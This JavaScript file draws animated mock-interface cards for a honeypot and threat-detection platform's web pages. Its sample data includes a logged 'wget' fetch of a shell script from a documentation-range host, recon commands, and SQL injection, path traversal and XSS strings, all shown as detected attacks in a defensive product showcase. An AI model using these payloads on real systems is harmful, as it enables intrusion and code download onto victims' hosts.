/* Drawings for the illustrated cards on the public sub-pages. Every [data-art="name"] element
   gets a small piece of mock interface, and the ones on screen step through a highlight so
   they feel live. The drawings use example data: addresses and the AS number come from
   documentation ranges. Rule ids, ports, roles, services, make targets and lab tools are the
   real ones from this repository. Decorative only, so each one is hidden from screen readers. */
(function () {
    'use strict';

    var animated = !window.matchMedia('(prefers-reduced-motion: reduce)').matches && 'IntersectionObserver' in window;

    function esc(s) {
        return String(s).replace(/[&<>"']/g, function (c) {
            return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
        });
    }

    var CHECK = '<svg class="ok r" viewBox="0 0 16 16"><path d="m3.500 8.500 3 3 6-7"/></svg>';

    function head(title, sub) {
        return '<div class="mock-head"><span>' + esc(title) + '</span>' + (sub ? '<span class="sub">' + esc(sub) + '</span>' : '') + '</div>';
    }

    // One list row. Keys: led, tag, t (label), m (mono), d (detail), dots, pips, ok, chip [tone, text], h (takes the highlight).
    function row(r, i) {
        var h = '<li style="--i:' + i + '"' + (r.h ? ' data-h' : '') + '>';
        if (r.led) h += '<i class="led"></i>';
        if (r.tag) h += '<span class="chip">' + esc(r.tag) + '</span>';
        if (r.t) h += '<span class="t">' + esc(r.t) + '</span>';
        if (r.m) h += '<span class="m">' + esc(r.m) + '</span>';
        if (r.d) h += '<span class="d">' + esc(r.d) + '</span>';
        if (r.dots) h += '<span class="dots">' + new Array(r.dots + 1).join('<i></i>') + '</span>';
        if (r.pips) h += '<span class="pips r">' + [1, 2, 3].map(function (n) { return '<i' + (n <= r.pips ? ' class="on"' : '') + '></i>'; }).join('') + '</span>';
        if (r.ok) h += CHECK;
        if (r.chip) h += '<span class="chip ' + r.chip[0] + ' r">' + esc(r.chip[1]) + '</span>';
        return h + '</li>';
    }

    function card(title, sub, rows) {
        return '<div class="mock">' + head(title, sub) + '<ul class="a-rows">' + rows.map(row).join('') + '</ul></div>';
    }

    // A terminal. Lines are [kind, text]: c = command, o = output, g = good.
    function term(title, sub, lines) {
        return '<div class="mock a-term">' + head(title, sub) + '<div class="a-screen">' + lines.map(function (l) {
            return '<span class="l ' + l[0] + '">' + (l[0] === 'c' ? '<b>$ </b>' : '') + esc(l[1]) + '</span>';
        }).join('') + '</div></div>';
    }

    var EVENTS = [
        ['login.failed', '198.51.100.7 · root / 123456', 'T1110'],
        ['smb connect', '192.0.2.61 · port 445', 'T1595'],
        ['login.success', '198.51.100.7 · oracle / oracle', 'T1110'],
        ['command', '198.51.100.7 · whoami; id; uname -a', 'T1059'],
        ['http request', '203.0.113.80 · GET / on 8022', 'T1190'],
        ['file_download', '198.51.100.7 · wget http://203.0.113.9/x.sh', 'T1105'],
    ];

    function eventRow(e) {
        return '<li><span class="t">' + new Date().toTimeString().slice(0, 8) + '</span>'
            + '<span class="ev"><b>' + esc(e[0]) + '</b><span>' + esc(e[1]) + '</span></span>'
            + '<span class="tech">' + esc(e[2]) + '</span></li>';
    }

    var TECH = [
        ['T1110', 'Brute Force'], ['T1059', 'Command and Scripting Interpreter'], ['T1046', 'Network Service Discovery'],
        ['T1105', 'Ingress Tool Transfer'], ['T1190', 'Exploit Public-Facing Application'], ['T1595', 'Active Scanning'],
    ];
    var TECH_CELL = [1, 10, 14, 20, 23, 33];

    var ART = {
        decoys: function () {
            return card('Decoy network', '3 sensors, 7 ports', [
                { led: 1, m: 'cowrie', d: 'ssh 2222 · telnet 2223', h: 1 },
                { led: 1, m: 'dionaea', d: 'smb 445 · ftp 2121 · mssql 1433', h: 1 },
                { led: 1, m: 'honeytrap', d: 'http 8022 · alt 8023', h: 1 },
            ]);
        },
        stream: function () {
            return '<div class="mock">' + head('Event stream', 'newest first') + '<ol class="stream a-stream">'
                + EVENTS.slice(0, 3).map(eventRow).join('') + '</ol></div>';
        },
        geo: function () {
            return card('198.51.100.7', 'enriched', [
                { t: 'Country', d: 'Netherlands', ok: 1 },
                { t: 'City', d: 'Amsterdam', ok: 1 },
                { t: 'ASN', m: 'AS64496', ok: 1 },
                { t: 'ISP', d: 'Example Hosting', ok: 1 },
            ]);
        },
        classify: function () {
            return card('Classifier', 'rule per label', [
                { m: "GET /item?id=1' OR '1'='1", chip: ['ruby', 'SQL injection'], h: 1 },
                { m: 'GET /../../etc/passwd', chip: ['orange', 'Path traversal'], h: 1 },
                { m: '<script>alert(1)</script>', chip: ['ruby', 'XSS'], h: 1 },
                { m: 'root / 123456  ×5', chip: ['', 'Brute force'], h: 1 },
            ]);
        },
        rules: function () {
            return card('backend/detections', '6 rules', [
                { m: 'st-auth-001', d: 'SSH / Telnet brute force', chip: ['orange', 'High'], h: 1 },
                { m: 'st-cred-002', d: 'Login after brute force', chip: ['ruby', 'Critical'], h: 1 },
                { m: 'st-exec-003', d: 'Post-exploitation command', chip: ['orange', 'High'], h: 1 },
                { m: 'st-exec-004', d: 'Payload download', chip: ['orange', 'High'], h: 1 },
                { m: 'st-exec-005', d: 'Suspicious PowerShell', chip: ['orange', 'High'], h: 1 },
                { m: 'st-recon-006', d: 'Port / service scan', chip: ['grey', 'Medium'], h: 1 },
            ]);
        },
        matrix: function () {
            var cells = '';
            for (var i = 0; i < 35; i++) cells += '<i' + (TECH_CELL.indexOf(i) > -1 ? ' class="on"' : '') + '></i>';
            return '<div class="mock matrix-card">' + head('Techniques seen', 'ATT&CK') + '<div class="art-matrix">' + cells
                + '</div><div class="art-tech" data-tech><b>' + TECH[0][0] + '</b>' + TECH[0][1] + '</div></div>';
        },
        malware: function () {
            return card('Captured sample', 'ELF, 48 KB', [
                { t: 'Hashes', d: 'MD5, SHA-1, SHA-256', ok: 1, h: 1 },
                { t: 'Static', d: 'headers, imports, strings', ok: 1, h: 1 },
                { t: 'Signatures', d: 'ClamAV, YARA', ok: 1, h: 1 },
                { t: 'CAPE sandbox', chip: ['grey', 'Not configured'], h: 1 },
                { t: 'Secrets', d: 'keys and tokens', ok: 1, h: 1 },
            ]);
        },
        apk: function () {
            return card('app-release.apk', 'MobSF static', [
                { m: 'READ_SMS', chip: ['ruby', 'Dangerous'], h: 1 },
                { m: 'RECORD_AUDIO', chip: ['ruby', 'Dangerous'], h: 1 },
                { m: 'INTERNET', chip: ['grey', 'Normal'], h: 1 },
                { t: 'Hardcoded secrets', chip: ['orange', 'Found'], h: 1 },
            ]);
        },
        url: function () {
            return card('example.com/login', 'URL scan', [
                { t: 'DNS records', ok: 1, h: 1 },
                { t: 'TLS certificate', ok: 1, h: 1 },
                { t: 'WHOIS record', ok: 1, h: 1 },
                { t: 'HTTP response', ok: 1, h: 1 },
                { t: 'Homograph check', ok: 1, h: 1 },
            ]);
        },
        lab: function () {
            return term('Kali desktop', 'localhost:8080', [
                ['c', 'whoami'], ['o', 'kali'],
                ['c', 'which nmap tcpdump'], ['o', '/usr/bin/nmap'], ['o', '/usr/bin/tcpdump'],
            ]);
        },
        roles: function () {
            return card('Roles', 'clearance 1 to 3', [
                { m: 'super_admin', pips: 3, h: 1 },
                { m: 'overseer', pips: 3, h: 1 },
                { m: 'auditor', pips: 2, h: 1 },
                { m: 'analyst', pips: 2, h: 1 },
                { m: 'specialist', pips: 2, h: 1 },
                { m: 'operative', pips: 1, h: 1 },
            ]);
        },
        delivery: function () {
            return card('New account', 'one-time token', [
                { t: 'Token', m: '•••• •••• ••••', chip: ['', 'Single use'], h: 1 },
                { t: 'Email', d: 'SMTP', ok: 1, h: 1 },
                { t: 'WhatsApp', d: 'Twilio', ok: 1, h: 1 },
                { t: 'Audit trail', chip: ['green', 'Logged'], h: 1 },
            ]);
        },
        sessions: function () {
            return card('Session engine', 'every 60 s', [
                { m: '198.51.100.7', dots: 9, d: 'ssh', h: 1 },
                { m: '203.0.113.24', dots: 4, d: 'smb', h: 1 },
                { m: '192.0.2.61', dots: 6, d: 'http', h: 1 },
            ]);
        },
        report: function () {
            return '<div class="mock a-page"><i class="a-page-line"></i><b>Executive summary</b><span>ShadowTrust · SOC reporting</span>'
                + '<div class="a-page-figs"><i class="a-donut"></i><div class="a-bars"><i style="--w:92%"></i><i style="--w:64%"></i><i style="--w:41%"></i><i style="--w:22%"></i></div></div>'
                + '<div class="a-lines"><i></i><i></i><i></i></div></div>';
        },
        incident: function () {
            return '<div class="mock case-card"><div class="cc-top"><span class="ic"><svg class="ico" viewBox="0 0 20 20"><path d="M2.500 6A1.500 1.500 0 0 1 4 4.500h3.300l1.700 2H16A1.500 1.500 0 0 1 17.500 8v6.500A1.500 1.500 0 0 1 16 16H4a1.500 1.500 0 0 1-1.500-1.500Z"/></svg></span>INC-000092</div>'
                + '<div class="cc-title">SSH brute force, then a payload pulled onto the host</div><div class="cc-sub">Auto-correlated · 198.51.100.7</div>'
                + '<dl><dt>Rules</dt><dd class="mono">st-auth-001 · st-exec-004</dd><dt>ATT&amp;CK</dt><dd class="mono">T1110 → T1105</dd><dt>Evidence</dt><dd>8 events, 1 session</dd></dl></div>';
        },
        stix: function () {
            return '<div class="mock a-code">' + head('bundle.json', 'STIX 2.1') + '<pre>{\n  <b>"type"</b>: "indicator",\n  <b>"spec_version"</b>: "2.1",\n  <b>"pattern_type"</b>: "stix",\n  <b>"pattern"</b>:\n    "[ipv4-addr:value = \'198.51.100.7\']"\n}</pre></div>';
        },
        compose: function () {
            return card('docker compose', 'on your own host', [
                { led: 1, m: 'backend', d: 'FastAPI', h: 1 },
                { led: 1, m: 'db', d: 'MariaDB 11', h: 1 },
                { led: 1, m: 'frontend', d: 'Nginx', h: 1 },
                { led: 1, m: 'cowrie', d: 'sensor', h: 1 },
                { led: 1, m: 'clamav', d: 'signatures', h: 1 },
            ]);
        },
        setup: function () {
            return term('./setup.sh', '6 steps', [
                ['c', './setup.sh'], ['o', '[1/6] Checking prerequisites...'], ['g', '  ✓ Docker'],
                ['o', '[5/6] Building images and starting containers...'], ['o', '[6/6] Verifying services...'],
            ]);
        },
        api: function () {
            return card('/api/v1', 'JWT bearer', [
                { tag: 'POST', m: '/auth/login', h: 1 },
                { tag: 'POST', m: '/events/ingest', h: 1 },
                { tag: 'POST', m: '/vm/launch', h: 1 },
            ]);
        },
        make: function () {
            return card('Makefile', 'make help', [
                { m: 'make up', d: 'start containers', h: 1 },
                { m: 'make logs', d: 'tail every container', h: 1 },
                { m: 'make status', d: 'container status', h: 1 },
                { m: 'make test', d: 'backend test suite', h: 1 },
            ]);
        },
    };

    var live = [];

    function mount(el, name) {
        if (!ART[name]) return;
        el.setAttribute('data-art', name);
        el.setAttribute('aria-hidden', 'true');
        el.classList.add('art');
        el.innerHTML = ART[name]();
        el._step = 0;
        var first = el.querySelector('[data-h]');
        if (first) first.classList.add('hit');
        // a terminal starts with its first line; without motion it shows every line
        el.querySelectorAll('.a-screen .l').forEach(function (l, i) { l.classList.toggle('on', !animated || i === 0); });
    }

    // One step of a drawing's loop: move the highlight, light the next technique, push an event or print a line.
    function step(el) {
        var n = ++el._step;
        var rows = el.querySelectorAll('[data-h]');
        if (rows.length) rows.forEach(function (r, i) { r.classList.toggle('hit', i === n % rows.length); });

        var cells = el.querySelectorAll('.art-matrix i.on');
        if (cells.length) {
            var k = n % TECH.length;
            cells.forEach(function (c, i) { c.classList.toggle('hot', i === k); });
            el.querySelector('[data-tech]').innerHTML = '<b>' + TECH[k][0] + '</b>' + TECH[k][1];
        }

        var stream = el.querySelector('.a-stream');
        if (stream) {
            stream.insertAdjacentHTML('afterbegin', eventRow(EVENTS[(n + 2) % EVENTS.length]));
            stream.firstChild.classList.add('in');
            stream.removeChild(stream.lastChild);
        }

        var lines = el.querySelectorAll('.a-screen .l');
        if (lines.length) {
            var shown = n % (lines.length + 2) + 1; // one more line each step, then a short hold before starting over
            lines.forEach(function (l, i) { l.classList.toggle('on', i < shown); });
        }
    }

    document.querySelectorAll('[data-art]').forEach(function (el) { mount(el, el.getAttribute('data-art')); });

    window.STArt = { mount: mount, names: Object.keys(ART) };

    if (!animated) return;
    document.documentElement.classList.add('art-ready');

    var io = new IntersectionObserver(function (entries) {
        entries.forEach(function (en) {
            en.target._vis = en.isIntersecting;
            if (en.isIntersecting) en.target.classList.add('seen');
        });
    }, { threshold: 0.35 });

    function watch() {
        document.querySelectorAll('.art').forEach(function (el) {
            if (live.indexOf(el) === -1) { live.push(el); io.observe(el); }
        });
    }
    watch();
    window.STArt.watch = watch;

    setInterval(function () {
        if (document.hidden) return;
        live.forEach(function (el) { if (el._vis) step(el); });
    }, 1600);
})();
